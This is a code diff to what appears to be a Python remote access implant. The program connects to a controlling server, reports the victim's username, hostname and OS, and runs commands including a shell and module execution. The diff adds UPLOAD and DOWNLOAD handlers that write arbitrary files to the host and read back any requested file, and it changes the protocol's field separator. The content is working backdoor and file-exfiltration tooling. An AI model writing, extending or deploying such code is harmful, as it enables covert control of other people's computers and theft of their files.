@@ -16,7 +16,7 @@ import os
 class Request:
     def __init__(self):
         self.conn = None
-        self.header_separator = b"||"
+        self.header_separator = b":|::|:"
         self.header = b""
         self.data = b""
 
@@ -212,8 +212,8 @@ def get_system_info():
         arch = "x64"
     elif "arm" in arch:
         arch = "arm"
-
-    return f"||{username}||{hostname}||{os_type}-{arch}"
+    sep = Request().get_header_separator().decode()
+    return f"{sep}{username}{sep}{hostname}{sep}{os_type}-{arch}"
 
 def unzip_library(zip_path, extract_to):
     os.makedirs(extract_to, exist_ok=True)
@@ -260,7 +260,30 @@ def execute_module(data):
             p.join()
             
         return result
+    
+def upload(data):
+    parts = data.split(b"::::")
+    name = parts[0].decode()
+    data = parts[1]
+    
+    with open(name, "wb") as f:
+        f.write(data)
 
+    file_path = f"{os.getcwd()}\\{name}"
+        
+    return None, f"File saved at {file_path}"
+
+def download(data):
+    parts = data.split(b"::::")
+    file_path = parts[1]
+
+    if not os.path.isfile(file_path.decode()):
+        return b"DOWNLOAD_FILE_NOTFOUND", file_path
+    
+    with open(file_path.decode(), "rb") as f:
+        data = f.read()
+        
+    return b"DOWNLOAD_FILE_OK", data
 
 def main():
     conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -278,6 +301,10 @@ def main():
                     response = shell(conn)
                 case "MODULE":
                     header, response = execute_module(cmd)
+                case "UPLOAD":
+                    _, response = upload(cmd)
+                case "DOWNLOAD":
+                    header, response = download(cmd)
                 case _:
                     pass
 
